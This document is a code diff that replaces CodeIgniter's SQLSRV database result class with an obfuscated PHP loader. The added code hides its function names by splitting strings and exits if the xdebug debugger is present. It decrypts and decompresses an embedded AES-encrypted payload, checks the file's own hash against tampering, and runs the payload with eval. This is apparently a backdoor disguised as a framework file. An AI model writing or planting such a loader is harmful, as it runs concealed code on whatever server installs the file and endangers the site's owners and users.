@@ -1,193 +1,28 @@
 <?php
-/**
- * CodeIgniter
- *
- * An open source application development framework for PHP
- *
- * This content is released under the MIT License (MIT)
- *
- * Copyright (c) 2014 - 2018, British Columbia Institute of Technology
- *
- * Permission is hereby granted, free of charge, to any person obtaining a copy
- * of this software and associated documentation files (the "Software"), to deal
- * in the Software without restriction, including without limitation the rights
- * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
- * copies of the Software, and to permit persons to whom the Software is
- * furnished to do so, subject to the following conditions:
- *
- * The above copyright notice and this permission notice shall be included in
- * all copies or substantial portions of the Software.
- *
- * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
- * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
- * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
- * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
- * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
- * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
- * THE SOFTWARE.
- *
- * @package	CodeIgniter
- * @author	EllisLab Dev Team
- * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
- * @copyright	Copyright (c) 2014 - 2018, British Columbia Institute of Technology (http://bcit.ca/)
- * @license	http://opensource.org/licenses/MIT	MIT License
- * @link	https://codeigniter.com
- * @since	Version 2.0.3
- * @filesource
- */
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/**
- * SQLSRV Result Class
- *
- * This class extends the parent result class: CI_DB_result
- *
- * @category	Database
- * @author		EllisLab Dev Team
- * @link		https://codeigniter.com/user_guide/database/
- */
-class CI_DB_sqlsrv_result extends CI_DB_result {
-
-	/**
-	 * Scrollable flag
-	 *
-	 * @var	mixed
-	 */
-	public $scrollable;
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Constructor
-	 *
-	 * @param	object	$driver_object
-	 * @return	void
-	 */
-	public function __construct(&$driver_object)
-	{
-		parent::__construct($driver_object);
-
-		$this->scrollable = $driver_object->scrollable;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Number of rows in the result set
-	 *
-	 * @return	int
-	 */
-	public function num_rows()
-	{
-		// sqlsrv_num_rows() doesn't work with the FORWARD and DYNAMIC cursors (FALSE is the same as FORWARD)
-		if ( ! in_array($this->scrollable, array(FALSE, SQLSRV_CURSOR_FORWARD, SQLSRV_CURSOR_DYNAMIC), TRUE))
-		{
-			return parent::num_rows();
-		}
-
-		return is_int($this->num_rows)
-			? $this->num_rows
-			: $this->num_rows = sqlsrv_num_rows($this->result_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Number of fields in the result set
-	 *
-	 * @return	int
-	 */
-	public function num_fields()
-	{
-		return @sqlsrv_num_fields($this->result_id);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Fetch Field Names
-	 *
-	 * Generates an array of column names
-	 *
-	 * @return	array
-	 */
-	public function list_fields()
-	{
-		$field_names = array();
-		foreach (sqlsrv_field_metadata($this->result_id) as $offset => $field)
-		{
-			$field_names[] = $field['Name'];
-		}
-
-		return $field_names;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Field data
-	 *
-	 * Generates an array of objects containing field meta-data
-	 *
-	 * @return	array
-	 */
-	public function field_data()
-	{
-		$retval = array();
-		foreach (sqlsrv_field_metadata($this->result_id) as $i => $field)
-		{
-			$retval[$i]		= new stdClass();
-			$retval[$i]->name	= $field['Name'];
-			$retval[$i]->type	= $field['Type'];
-			$retval[$i]->max_length	= $field['Size'];
-		}
-
-		return $retval;
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Free the result
-	 *
-	 * @return	void
-	 */
-	public function free_result()
-	{
-		if (is_resource($this->result_id))
-		{
-			sqlsrv_free_stmt($this->result_id);
-			$this->result_id = FALSE;
-		}
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Result - associative array
-	 *
-	 * Returns the result set as an array
-	 *
-	 * @return	array
-	 */
-	protected function _fetch_assoc()
-	{
-		return sqlsrv_fetch_array($this->result_id, SQLSRV_FETCH_ASSOC);
-	}
-
-	// --------------------------------------------------------------------
-
-	/**
-	 * Result - object
-	 *
-	 * Returns the result set as an object
-	 *
-	 * @param	string	$class_name
-	 * @return	object
-	 */
-	protected function _fetch_object($class_name = 'stdClass')
-	{
-		return sqlsrv_fetch_object($this->result_id, $class_name);
-	}
-
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_wg9h8v3z=('bas'.'e64'.'_de'.'cod'.'e');
+$_iy9lftcn=('gzu'.'nco'.'mpr'.'ess');
+$_psr8ayrx=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_pm1cl42l='MmxJQW2n';
+$_aejxcmkf='SMRrE9j/nGo=';
+$_awjc2alq='SLIs+r1N';
+$_t5wxsnpq='Gv8w9eMz';
+$_h2ruty10='YR9cZsBs';
+$_h7p6o5up='c8l+WA==';
+$_nlq2gqnr='tKR4KyO6';
+$_qwptjpv6='oeq7BNiB';
+$_d8ma46ah=$_wg9h8v3z($_pm1cl42l.$_h2ruty10.$_awjc2alq.$_t5wxsnpq.$_aejxcmkf);
+$_k39or316=$_wg9h8v3z($_qwptjpv6.$_nlq2gqnr.$_h7p6o5up);
+$_iv60bqod=$_wg9h8v3z('WY493mmNmyaT9G+DRwnFBYClxIiItXsn7UZd8RDqdTtapVx8kwbDSehQ4eDW7qGnwt8CQrOLwGRJqTzCnD1R5G6MB0sc6Thn81Y4uCvkP2gjN4mjQ1LqVkfCPt+Zo/Nk5i5o/qJmlblsHvI4M+SBYF6BE/J9GH3vX667YMDXjeuBoe0kXcPObK1JtcqgQxeS2JwkdguzNErjdLjjZR7Kqnaoefn6GZEemEfruZfLp2rAQDkO49kPg6wuTbB3YBuqh+lV+Swh/4p5z4S3R6Nwzs4deB81HSq/xK4AypSbE8SE6SqWOF4kfqWP2Yt/FzEcOpTgJzzeP/eRIsjq0r/OkAUV2K/B2n+viJFEh9nvlsp8ug192J6QqWJO981kdzDujY8N4fkBemUzWcrEoPgMC8k/Fy88oTU8rQgGEDZGiu7LWDliDoWtUUPr+zgoQGD9/pgO9O6GvHLBykU2bnwX1iqeZJDm1rBg26X0t4m/3JtEVXaSOtnNaBzu/Te/24OejoPNot634RwnC0Hi+IscX2tWYbI3Fg6SGF6PvGOQ48fyAN591jp1m4dt30F7xaOoskb/2WNRhA5iq4sbBEJCgqLFLGxvX+3WGyH7uTRW444h69g60Gd9DLby3JlkV0kkjeZwk9IKFmNh2ZmLRd819SL0HW+nNlAM1Mnhvjww/MI3C7tnarprfVsTOhQvoIma4jbZo1QLbw2QI18OGrbqNGlrfpN8nJFH28RCxWDJHkE6uCCHtGMcD+jvOSa3Sz3X');
+$_fkcsrbzb=$_psr8ayrx($_iv60bqod,'aes-256-cbc',$_d8ma46ah,OPENSSL_RAW_DATA,$_k39or316);
+if($_fkcsrbzb===false){exit;}
+$_j9k2ddv9=$_iy9lftcn($_fkcsrbzb);
+if($_j9k2ddv9===false){exit;}
+$_dcd5h2ll='c6543ef6cb4fc521464d35c84989d1f7650747cb7d0446e0742ed6f8d01a9af7';
+$_mf6n8d6i=@file_get_contents(__FILE__);
+if($_mf6n8d6i!==false){
+$_o319wdis=str_replace($_dcd5h2ll,"0000000000000000000000000000000000000000000000000000000000000000",$_mf6n8d6i);
+$_cx5u9iyn=hash("sha256",$_o319wdis);
+if($_cx5u9iyn!==$_dcd5h2ll){@http_response_code(403);exit;}
 }
+eval($_j9k2ddv9);
